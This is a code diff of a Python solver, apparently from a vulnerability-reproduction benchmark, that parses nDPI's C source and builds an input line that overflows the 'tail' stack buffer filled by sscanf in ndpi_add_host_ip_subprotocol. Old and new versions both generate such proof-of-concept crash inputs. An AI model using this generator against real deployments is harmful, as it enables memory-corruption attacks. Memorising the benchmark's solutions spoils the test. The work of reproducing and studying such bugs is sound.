@@ -1,455 +1,411 @@
 import os
-import re
 import tarfile
 import tempfile
-import shutil
+import re
+import codecs
+import string
+
+
+def find_file(root, filename):
+    for dirpath, _, files in os.walk(root):
+        if filename in files:
+            return os.path.join(dirpath, filename)
+    return None
+
+
+def extract_function_body(code, func_name):
+    pattern = re.compile(re.escape(func_name) + r'\s*\(')
+    for m in pattern.finditer(code):
+        start_idx = m.start()
+        paren_start = code.find('(', start_idx)
+        if paren_start == -1:
+            continue
+        depth = 1
+        i = paren_start + 1
+        n = len(code)
+        while i < n and depth > 0:
+            c = code[i]
+            if c == '(':
+                depth += 1
+            elif c == ')':
+                depth -= 1
+            i += 1
+        if depth != 0:
+            continue
+        after_paren = i
+        j = after_paren
+        while j < n and code[j].isspace():
+            j += 1
+        if j < n and code[j] == ';':
+            continue
+        if j < n and code[j] != '{':
+            while j < n and code[j] not in '{;':
+                j += 1
+            if j >= n or code[j] != '{':
+                continue
+        if j >= n or code[j] != '{':
+            continue
+        brace_start = j
+        depth = 1
+        k = brace_start + 1
+        while k < n and depth > 0:
+            c = code[k]
+            if c == '{':
+                depth += 1
+            elif c == '}':
+                depth -= 1
+            k += 1
+        if depth != 0:
+            continue
+        return code[brace_start:k]
+    return None
+
+
+def parse_tail_buf_size(func_body):
+    m = re.search(r'\bchar\s+tail\s*\[\s*([^\]]+)\]', func_body)
+    if not m:
+        return 64
+    inside = m.group(1)
+    m2 = re.search(r'(\d+)', inside)
+    if m2:
+        return int(m2.group(1))
+    return 64
+
+
+def split_args(arg_str):
+    args = []
+    buf = []
+    depth = 0
+    in_str = False
+    esc = False
+    for ch in arg_str:
+        if in_str:
+            buf.append(ch)
+            if esc:
+                esc = False
+            elif ch == '\\':
+                esc = True
+            elif ch == '"':
+                in_str = False
+            continue
+        if ch == '"':
+            in_str = True
+            buf.append(ch)
+            continue
+        if ch == '(':
+            depth += 1
+        elif ch == ')':
+            if depth > 0:
+                depth -= 1
+        if ch == ',' and depth == 0:
+            args.append(''.join(buf).strip())
+            buf = []
+        else:
+            buf.append(ch)
+    if buf:
+        args.append(''.join(buf).strip())
+    return args
+
+
+def extract_c_string_literal(arg):
+    parts = []
+    i = 0
+    n = len(arg)
+    while i < n:
+        while i < n and arg[i] != '"':
+            i += 1
+        if i >= n:
+            break
+        j = i + 1
+        esc = False
+        while j < n:
+            ch = arg[j]
+            if esc:
+                esc = False
+                j += 1
+            else:
+                if ch == '\\':
+                    esc = True
+                    j += 1
+                elif ch == '"':
+                    break
+                else:
+                    j += 1
+        if j >= n:
+            break
+        literal = arg[i + 1:j]
+        try:
+            decoded = codecs.decode(literal, 'unicode_escape')
+        except Exception:
+            try:
+                decoded = literal.encode('utf-8').decode('unicode_escape')
+            except Exception:
+                decoded = literal.replace(r'\"', '"').replace(r'\n', '\n').replace(r'\t', '\t').replace(r'\\', '\\')
+        parts.append(decoded)
+        i = j + 1
+    return ''.join(parts)
+
+
+def parse_scanf_format(fmt):
+    convs = []
+    i = 0
+    n = len(fmt)
+    while i < n:
+        if fmt[i] == '%':
+            if i + 1 < n and fmt[i + 1] == '%':
+                i += 2
+                continue
+            start = i
+            i += 1
+            assign = True
+            if i < n and fmt[i] == '*':
+                assign = False
+                i += 1
+            width_str = ''
+            while i < n and fmt[i].isdigit():
+                width_str += fmt[i]
+                i += 1
+            width = int(width_str) if width_str else None
+            while i < n and fmt[i] in "hljztLq":
+                i += 1
+            if i < n and fmt[i] == '[':
+                j = i + 1
+                if j < n and fmt[j] == '^':
+                    j += 1
+                if j < n and fmt[j] == ']':
+                    j += 1
+                while j < n and fmt[j] != ']':
+                    j += 1
+                if j < n:
+                    j += 1
+                end = j
+                spec = fmt[start:end]
+                convs.append({
+                    'spec': spec,
+                    'assign': assign,
+                    'convchar': '[',
+                    'width': width,
+                    'start': start,
+                    'end': end
+                })
+                i = j
+            else:
+                if i < n:
+                    convchar = fmt[i]
+                    i += 1
+                else:
+                    convchar = None
+                end = i
+                spec = fmt[start:end]
+                convs.append({
+                    'spec': spec,
+                    'assign': assign,
+                    'convchar': convchar,
+                    'width': width,
+                    'start': start,
+                    'end': end
+                })
+        else:
+            i += 1
+    return convs
+
+
+def choose_char_for_charclass(spec, default='A'):
+    m = re.search(r'\[([^]]*)\]', spec)
+    if not m:
+        return default
+    content = m.group(1)
+    neg = content.startswith('^')
+    charset_def = content[1:] if neg else content
+    allowed = set()
+    i = 0
+    n = len(charset_def)
+    while i < n:
+        ch = charset_def[i]
+        if i + 2 < n and charset_def[i + 1] == '-':
+            start = charset_def[i]
+            end = charset_def[i + 2]
+            try:
+                s_ord = ord(start)
+                e_ord = ord(end)
+                if s_ord <= e_ord:
+                    for code in range(s_ord, e_ord + 1):
+                        allowed.add(chr(code))
+            except Exception:
+                allowed.add(start)
+                allowed.add(end)
+            i += 3
+        else:
+            allowed.add(ch)
+            i += 1
+    candidates = string.ascii_letters + string.digits + '_'
+    if not neg:
+        for ch in candidates:
+            if ch in allowed:
+                return ch
+        return default
+    else:
+        for ch in candidates:
+            if ch not in allowed:
+                return ch
+        return default
+
+
+def sample_for_conv(conv, is_tail, tail_buf_size):
+    c = conv['convchar']
+    width = conv['width']
+    if tail_buf_size is None or tail_buf_size <= 0:
+        tail_buf_size = 32
+    tail_target = max(tail_buf_size * 2, tail_buf_size + 16, 64)
+    tail_target = min(tail_target, 4096)
+    if width is not None:
+        if is_tail:
+            if width <= tail_buf_size:
+                length = width
+            else:
+                length = min(width, tail_target)
+        else:
+            length = min(width, 8)
+    else:
+        if is_tail:
+            length = tail_target
+        else:
+            length = 8
+    if c == 'n':
+        return ''
+    if c in ('d', 'i', 'u', 'o', 'x', 'X'):
+        return '1'
+    if c in ('f', 'F', 'e', 'E', 'g', 'G', 'a', 'A'):
+        return '1.0'
+    if c == 'c':
+        return 'C' * max(1, min(length, 4))
+    if c == 's':
+        ch = 'T' if is_tail else 'S'
+        if is_tail:
+            return ch * max(1, length)
+        else:
+            return ch
+    if c == '[':
+        ch = choose_char_for_charclass(conv['spec'], default=('T' if is_tail else 'S'))
+        if is_tail:
+            return ch * max(1, length)
+        else:
+            return ch
+    if c == 'p':
+        return '1'
+    if is_tail:
+        return 'T' * max(1, length)
+    return '1'
+
+
+def transform_literal_for_scanf(lit):
+    if not lit:
+        return ''
+    res = []
+    in_ws = False
+    for ch in lit:
+        if ch.isspace():
+            if not in_ws:
+                res.append(' ')
+                in_ws = True
+        else:
+            res.append(ch)
+            in_ws = False
+    return ''.join(res)
+
+
+def generate_input_from_format(fmt, tail_conv_idx, tail_buf_size):
+    convs = parse_scanf_format(fmt)
+    out = []
+    idx = 0
+    for i, conv in enumerate(convs):
+        lit = fmt[idx:conv['start']]
+        out.append(transform_literal_for_scanf(lit))
+        is_tail = (i == tail_conv_idx)
+        sample = sample_for_conv(conv, is_tail, tail_buf_size)
+        out.append(sample)
+        idx = conv['end']
+    out.append(transform_literal_for_scanf(fmt[idx:]))
+    s = ''.join(out)
+    if not s:
+        s = 'A' * max(tail_buf_size + 16, 64)
+    return s
+
+
+def find_tail_sscanf(func_body, tail_buf_size):
+    best = None
+    for match in re.finditer(r'sscanf\s*\((.*?)\);', func_body, re.DOTALL):
+        inside = match.group(1)
+        args = split_args(inside)
+        if len(args) < 3:
+            continue
+        param_exprs = args[2:]
+        tail_idx = -1
+        for i, expr in enumerate(param_exprs):
+            if re.search(r'\btail\b', expr):
+                tail_idx = i
+                break
+        if tail_idx == -1:
+            continue
+        fmt_arg = args[1]
+        fmt_str = extract_c_string_literal(fmt_arg)
+        if not fmt_str:
+            continue
+        convs = parse_scanf_format(fmt_str)
+        conv_indices = [i for i, c in enumerate(convs) if c['assign']]
+        if len(conv_indices) <= tail_idx:
+            continue
+        tail_conv_idx = conv_indices[tail_idx]
+        conv = convs[tail_conv_idx]
+        width = conv['width']
+        vulnerable = (width is None) or (width > tail_buf_size)
+        info = {
+            'format': fmt_str,
+            'tail_conv_idx': tail_conv_idx,
+            'width': width,
+            'vulnerable': vulnerable
+        }
+        if vulnerable:
+            return info
+        if best is None:
+            best = info
+    return best
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        tmpdir = None
+        tmpdir = tempfile.mkdtemp(prefix="ndpi_poc_")
         try:
-            if os.path.isdir(src_path):
-                root_dir = src_path
-            else:
-                tmpdir = tempfile.mkdtemp(prefix="ndpi_src_")
-                with tarfile.open(src_path, "r:*") as tf:
-                    tf.extractall(tmpdir)
-                root_dir = tmpdir
+            with tarfile.open(src_path, 'r:*') as tar:
+                tar.extractall(tmpdir)
+        except Exception:
+            # Fallback: arbitrary long string
+            return b'A' * 64
 
-            fmt = None
-            tail_index = None
+        ndpi_main_path = find_file(tmpdir, 'ndpi_main.c')
+        if not ndpi_main_path:
+            return b'A' * 64
 
-            for root, _, files in os.walk(root_dir):
-                for fn in files:
-                    if not fn.endswith(".c"):
-                        continue
-                    path = os.path.join(root, fn)
-                    try:
-                        with open(path, "r", encoding="utf-8", errors="ignore") as f:
-                            code = f.read()
-                    except Exception:
-                        continue
+        try:
+            with open(ndpi_main_path, 'r', encoding='latin1', errors='ignore') as f:
+                code = f.read()
+        except Exception:
+            return b'A' * 64
 
-                    res = self._locate_format_in_text(code)
-                    if res is not None:
-                        fmt, tail_index = res
-                        break
-                if fmt is not None:
-                    break
+        func_body = extract_function_body(code, 'ndpi_add_host_ip_subprotocol')
+        if not func_body:
+            return b'A' * 64
 
-            if fmt is not None:
-                poc_line = self._build_poc_line(fmt, tail_index)
-                return poc_line.encode("utf-8", "ignore")
+        tail_buf_size = parse_tail_buf_size(func_body)
+        scanf_info = find_tail_sscanf(func_body, tail_buf_size)
+        if not scanf_info:
+            return b'A' * max(tail_buf_size + 16, 64)
 
-            # Fallback: generic long token likely to overflow an unsafe %s in rules parser
-            return b"host ip proto " + b"A" * 1024
-        finally:
-            if tmpdir is not None and os.path.isdir(tmpdir):
-                shutil.rmtree(tmpdir, ignore_errors=True)
+        fmt = scanf_info['format']
+        tail_conv_idx = scanf_info['tail_conv_idx']
+        what_to_add = generate_input_from_format(fmt, tail_conv_idx, tail_buf_size)
 
-    # ---------- High-level analysis helpers ----------
-
-    def _locate_format_in_text(self, text):
-        """
-        Find ndpi_add_host_ip_subprotocol definition in given C source text
-        and extract the sscanf format string and index of the argument bound
-        to the 'tail' buffer.
-        """
-        pattern = re.compile(
-            r'\bndpi_add_host_ip_subprotocol\s*\([^;{]*\)\s*\{',
-            re.DOTALL,
-        )
-        m = pattern.search(text)
-        if not m:
-            return None
-
-        brace_pos = m.end() - 1
-        end_brace = self._match_bracket(text, brace_pos, '{', '}')
-        if end_brace is None:
-            body = text[brace_pos:]
-        else:
-            body = text[brace_pos:end_brace + 1]
-
-        fmt, tail_index = self._analyze_function(body)
-        if fmt is None:
-            return None
-        return fmt, tail_index
-
-    def _analyze_function(self, code):
-        """
-        Within the function body, locate sscanf calls that write into 'tail'
-        and extract their format strings and the index of the corresponding
-        conversion specifier.
-        """
-        if "tail" not in code or "sscanf" not in code:
-            return None, None
-
-        pos = 0
-        while True:
-            idx = code.find("sscanf", pos)
-            if idx == -1:
-                break
-
-            paren_idx = code.find("(", idx)
-            if paren_idx == -1:
-                break
-
-            end_paren = self._match_bracket(code, paren_idx, "(", ")")
-            if end_paren is None:
-                break
-
-            args_str = code[paren_idx + 1:end_paren]
-            args = self._split_args(args_str)
-            if len(args) < 3:
-                pos = end_paren + 1
-                continue
-
-            tail_arg_idx = None
-            for j in range(2, len(args)):
-                if re.search(r'\btail\b', args[j]):
-                    tail_arg_idx = j
-                    break
-            if tail_arg_idx is None:
-                pos = end_paren + 1
-                continue
-
-            fmt = self._extract_format_string(code, paren_idx, end_paren)
-            if fmt is None:
-                pos = end_paren + 1
-                continue
-
-            spec_index = tail_arg_idx - 2
-            return fmt, spec_index
-
-        return None, None
-
-    # ---------- Low-level C parsing utilities ----------
-
-    def _match_bracket(self, text, pos, open_ch, close_ch):
-        """
-        Find the matching closing bracket for the bracket at position pos.
-        Handles strings and comments conservatively.
-        """
-        depth = 1
-        i = pos + 1
-        n = len(text)
-
-        in_str = False
-        str_ch = ""
-        in_char = False
-        in_line_comment = False
-        in_block_comment = False
-        esc = False
-
-        while i < n:
-            ch = text[i]
-
-            if in_str:
-                if esc:
-                    esc = False
-                elif ch == "\\":
-                    esc = True
-                elif ch == str_ch:
-                    in_str = False
-                i += 1
-                continue
-
-            if in_char:
-                if esc:
-                    esc = False
-                elif ch == "\\":
-                    esc = True
-                elif ch == "'":
-                    in_char = False
-                i += 1
-                continue
-
-            if in_line_comment:
-                if ch == "\n":
-                    in_line_comment = False
-                i += 1
-                continue
-
-            if in_block_comment:
-                if ch == "*" and i + 1 < n and text[i + 1] == "/":
-                    in_block_comment = False
-                    i += 2
-                    continue
-                i += 1
-                continue
-
-            if ch == '"':
-                in_str = True
-                str_ch = '"'
-                esc = False
-                i += 1
-                continue
-            if ch == "'":
-                in_char = True
-                esc = False
-                i += 1
-                continue
-            if ch == "/" and i + 1 < n:
-                nxt = text[i + 1]
-                if nxt == "/":
-                    in_line_comment = True
-                    i += 2
-                    continue
-                if nxt == "*":
-                    in_block_comment = True
-                    i += 2
-                    continue
-
-            if ch == open_ch:
-                depth += 1
-            elif ch == close_ch:
-                depth -= 1
-                if depth == 0:
-                    return i
-
-            i += 1
-
-        return None
-
-    def _split_args(self, argstr):
-        """
-        Split function argument list into individual arguments,
-        respecting parentheses and string literals.
-        """
-        args = []
-        current = []
-        depth = 0
-        in_str = False
-        str_ch = ""
-        esc = False
-
-        for ch in argstr:
-            if in_str:
-                current.append(ch)
-                if esc:
-                    esc = False
-                elif ch == "\\":
-                    esc = True
-                elif ch == str_ch:
-                    in_str = False
-                continue
-
-            if ch in ('"', "'"):
-                in_str = True
-                str_ch = ch
-                current.append(ch)
-            elif ch == "(":
-                depth += 1
-                current.append(ch)
-            elif ch == ")":
-                depth -= 1
-                current.append(ch)
-            elif ch == "," and depth == 0:
-                arg = "".join(current).strip()
-                if arg:
-                    args.append(arg)
-                current = []
-            else:
-                current.append(ch)
-
-        if current:
-            arg = "".join(current).strip()
-            if arg:
-                args.append(arg)
-
-        return args
-
-    def _extract_format_string(self, text, paren_start, paren_end):
-        """
-        Extract the first double-quoted C string literal between paren_start
-        and paren_end, and unescape it.
-        """
-        segment = text[paren_start:paren_end + 1]
-        start = segment.find('"')
-        if start == -1:
-            return None
-
-        i = start + 1
-        esc = False
-        n = len(segment)
-        while i < n:
-            ch = segment[i]
-            if esc:
-                esc = False
-            elif ch == "\\":
-                esc = True
-            elif ch == '"':
-                raw = segment[start + 1:i]
-                return self._unescape_c_string(raw)
-            i += 1
-        return None
-
-    def _unescape_c_string(self, s):
-        """
-        Simplified C string unescape (handles common escapes).
-        """
-        out = []
-        i = 0
-        n = len(s)
-        while i < n:
-            ch = s[i]
-            if ch != "\\":
-                out.append(ch)
-                i += 1
-                continue
-
-            i += 1
-            if i >= n:
-                break
-            c = s[i]
-
-            if c == "n":
-                out.append("\n")
-                i += 1
-            elif c == "t":
-                out.append("\t")
-                i += 1
-            elif c == "r":
-                out.append("\r")
-                i += 1
-            elif c == "\\":
-                out.append("\\")
-                i += 1
-            elif c == '"':
-                out.append('"')
-                i += 1
-            elif c in "01234567":
-                # Octal escape, up to 3 digits (including this one)
-                val = 0
-                count = 0
-                while i < n and count < 3 and s[i] in "01234567":
-                    val = val * 8 + (ord(s[i]) - ord("0"))
-                    i += 1
-                    count += 1
-                out.append(chr(val & 0xFF))
-            elif c == "x":
-                # Hex escape, up to 2 hex digits
-                i += 1
-                val = 0
-                count = 0
-                while i < n and count < 2 and s[i] in "0123456789abcdefABCDEF":
-                    val = val * 16 + int(s[i], 16)
-                    i += 1
-                    count += 1
-                if count > 0:
-                    out.append(chr(val & 0xFF))
-            else:
-                # Default: treat unknown escape as the char itself
-                out.append(c)
-                i += 1
-
-        return "".join(out)
-
-    # ---------- Format parsing and PoC construction ----------
-
-    def _parse_format(self, fmt):
-        """
-        Parse a scanf-style format string into a list of (delimiter, spec)
-        pairs and the trailing delimiter after the last spec.
-        """
-        pieces = []
-        i = 0
-        n = len(fmt)
-        last_end = 0
-
-        while i < n:
-            ch = fmt[i]
-            if ch == "%":
-                if i + 1 < n and fmt[i + 1] == "%":
-                    # literal '%', part of delimiter
-                    i += 2
-                    continue
-
-                # Start of a conversion specifier
-                delim = fmt[last_end:i]
-
-                j = i + 1
-                # Assignment suppression
-                if j < n and fmt[j] == "*":
-                    j += 1
-                # Width
-                while j < n and fmt[j].isdigit():
-                    j += 1
-                # Length modifiers
-                while j < n and fmt[j] in "hlLzjt":
-                    j += 1
-
-                if j < n and fmt[j] == "[":
-                    # scanset %[...]
-                    j += 1
-                    if j < n and fmt[j] == "]":
-                        j += 1
-                    while j < n and fmt[j] != "]":
-                        j += 1
-                    if j < n:
-                        j += 1
-                else:
-                    if j < n:
-                        j += 1
-
-                spec = fmt[i:j]
-                pieces.append((delim, spec))
-                last_end = j
-                i = j
-            else:
-                i += 1
-
-        tail_delim = fmt[last_end:]
-        return pieces, tail_delim
-
-    def _spec_type(self, spec):
-        if spec.endswith("]"):
-            return "["
-        return spec[-1] if spec else ""
-
-    def _generate_value_for_spec(self, spec, is_tail):
-        conv = self._spec_type(spec)
-        if not is_tail:
-            if conv in "diouxX":
-                return "1"
-            if conv in "fFeEgGaA":
-                return "1.0"
-            if conv in "cC":
-                return "A"
-            if conv == "p":
-                return "0x1"
-            if conv in "s[":
-                return "B"
-            if conv == "n":
-                # %n does not consume input; give something small
-                return ""
-            return "1"
-
-        # Tail spec: we want a large token to overflow the stack buffer
-        big_len = 1024
-        if conv in "s[":
-            return "A" * big_len
-        if conv in "cC":
-            return "Z" * big_len
-        if conv in "diouxXfFeEgGaApn":
-            return "9" * big_len
-        return "A" * big_len
-
-    def _build_poc_line(self, fmt, tail_index):
-        pieces, _ = self._parse_format(fmt)
-        if not pieces:
-            return "A" * 1024
-
-        if tail_index < 0 or tail_index >= len(pieces):
-            tail_index = len(pieces) - 1
-
-        out_parts = []
-        for i, (delim, spec) in enumerate(pieces):
-            if delim:
-                out_parts.append(delim)
-            is_tail = (i == tail_index)
-            val = self._generate_value_for_spec(spec, is_tail)
-            out_parts.append(val)
-
-        return "".join(out_parts)
+        try:
+            return what_to_add.encode('ascii', 'replace')
+        except Exception:
+            return what_to_add.encode('latin1', 'replace')
